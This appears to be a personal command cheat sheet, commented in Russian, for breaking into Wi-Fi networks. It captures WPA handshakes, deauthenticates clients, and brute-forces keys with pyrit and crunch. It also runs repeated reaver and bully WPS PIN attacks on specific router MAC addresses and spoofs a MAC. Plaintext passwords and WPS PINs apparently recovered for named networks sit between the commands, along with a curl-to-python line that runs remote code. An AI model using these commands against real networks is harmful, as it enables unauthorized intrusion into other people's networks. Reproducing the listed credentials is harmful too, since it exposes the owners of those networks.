#
git clone http://github.com/aircrack-ng/aircrack-ng
env NOCONFIGURE=1 ./autogen.sh
./configure
make
sudo make install

# убить все процессы которые могу помешать остановить монитори wifi трафик
sudo airmon-ng check kill
# Запустите беспроводной интерфейс в режиме мониторинга:
sudo airmon-ng start wlo1
# Перехват рукопожатия
sudo airodump-ng wlo1mon

iw dev wlo0mon del
sudo airmon-ng start wlo1mon
# Мониторить сеть
sudo airodump-ng -c 5 --bssid B0:BE:76:09:3F:B0 -w WPAcrack wlo1mon --ignore-negative-one
# Деаунтификация клиента
sudo aireplay-ng --deauth 100 -a B0:BE:76:09:3F:B0 -c 20:82:C0:E6:51:29 wlo1mon --ignore-negative-one

# нализируем файл на наличе хендшейков
pyrit -r WPAcrack-06.cap analyze
# Генерируем пароль
crunch 3 7 abcd -o dict.txt
# Подбираем пароль для хендшейка
pyrit --all-handshakes -r WPAcrack-06.cap -i dict.txt attack_passthrough

# посмотреть видит ли GPU
pyrit list_cores

pyrit benchmark

password: Unz7ipd*

# подключиться к wifi через консоль
# смотреть
iw dev
iw wlo1 link
# Сканировать wifi сеть
sudo iw wlo1 scan
nmcli dev wifi connect "wf-df-24" password "Unz7ipd*"

#проверка скорости интернета через консоль
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -

# proxy list checker
cat proxylist | parallel --tag curl  --insecure --proxy {} -o /dev/null --silent --head --write-out  '%{http_code}' http://www.fsf.org/ --max-time 5

# rever
sudo systemctl disable avahi-daemon
sudo airmon-ng check kill
sudo airmon-ng start wlo1
sudo airmon-ng start wlx983f9f190885
sudo airodump-ng wlan0mon
sudo wash -i wlan0mon
# Хаки для rever если есть ошибки
#https://hackware.ru/?p=1049

# подмена mac
# ifconfig wlan0 down
# ifconfig wlan0 hw ether 04:DE:AD:BE:EF:45
# ifconfig wlan0 up
# airmon-ng start wlan0
# reaver -i wlan0mon -b 4C:72:B9:FE:B8:0C -vv --mac=04:DE:AD:BE:EF:45
#*Особая заметка: если вы атакуете ТД Realtek, НЕ используйте маленькие ключи DH (-S)
sudo reaver -i wlan0mon -b 5C:F4:AB:CE:9A:98 -c 1 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b C4:A8:1D:62:60:FA -c 1 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b F4:6D:04:7E:45:75 -c 1 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b 4C:5E:0C:67:A5:0F -c 1 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b 64:66:B3:F2:B8:9C -c 1 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b 10:7B:EF:5B:71:A8  -c 4 -vvv -K 1 -f ‐‐dh-small -t 2 -d 0
sudo reaver -i wlan0mon -b 28:28:5D:E7:8B:CA -c 9 -vv -K 1 -f -p 87545456
sudo reaver -i wlan0mon -b 28:28:5D:E7:8B:CA -c 9 -s y -vv -p 87545456

sudo reaver -i wlan0mon -b C8:6C:87:73:1D:43 -c 1 -vv -K 1 -f
sudo reaver -i wlan0mon -b 10:7B:EF:5B:71:A8 -c 4 -vv -Z -f
sudo reaver -i wlan0mon -b 08:BD:43:C2:D1:62 -c 9 -vv -K 1 -f -S -s -L -d 30
sudo reaver -i wlan0mon -b 70:4D:7B:8B:EB:68 -c 12 -vv -K 1 -f ‐‐dh-small -t 2 -d 0 -p 01233414 --no-nacks

network={
	ssid="CoolBro"
	psk="home32377"
	proto=RSN
	key_mgmt=WPA-PSK
	pairwise=CCMP
	auth_alg=OPEN
}

# googlebot
# 18:0F:76:8F:5A:25    5  -55  2.0  No   RealtekS  KENNET NET
sudo reaver -i wlan0mon -b 18:0F:76:8F:5A:25 -c 5 -vv -K 1 -f ‐‐dh-small -t 2 -d 0 -p 34022566

network={
»···ssid="KENNET NET"
»···psk="vespassian1552"
»···proto=RSN
»···key_mgmt=WPA-PSK
»···pairwise=CCMP
»···auth_alg=OPEN
}

#B2:10:41:72:CF:4B   13  -55  2.0  No             DIRECT-hX-BRAVIA
sudo reaver -i wlan0mon -b 18:D6:C7:F8:62:16 -c 10 -vv -K 1 ‐‐dh-small -s -L -d 5 --lock-delay=315 --no-nacks -T 0.5 -x 360 -p 38405211

network={
        ssid="TP-LINK_6216"
        psk="38405211"
        proto=RSN
        key_mgmt=WPA-PSK
        pairwise=CCMP
        auth_alg=OPEN
}

wpa_passphrase B0:6E:BF:7A:61:90 "Unz7ipd*" > myssid.conf
wpa_supplicant -B -i my_interface -c myssid.conf
dhcpcd my_interface
# wps pin
http://kamilslab.com/2016/08/24/how-to-get-the-psk-or-password-of-a-wifi-network-if-you-have-the-wps-pin/
sudo wpa_supplicant -Dwext -iwlan0mon -c/etc/wpa_supplicant.conf –B
sudo wpa_cli
wps_reg 18:0F:76:8F:5A:25 34022566
sudo dhclient wlan0mon

bully --channel 11 --bssid b0:be:76:9:3f:b0 --pin 58272336 --bruteforce --force wlan0mon
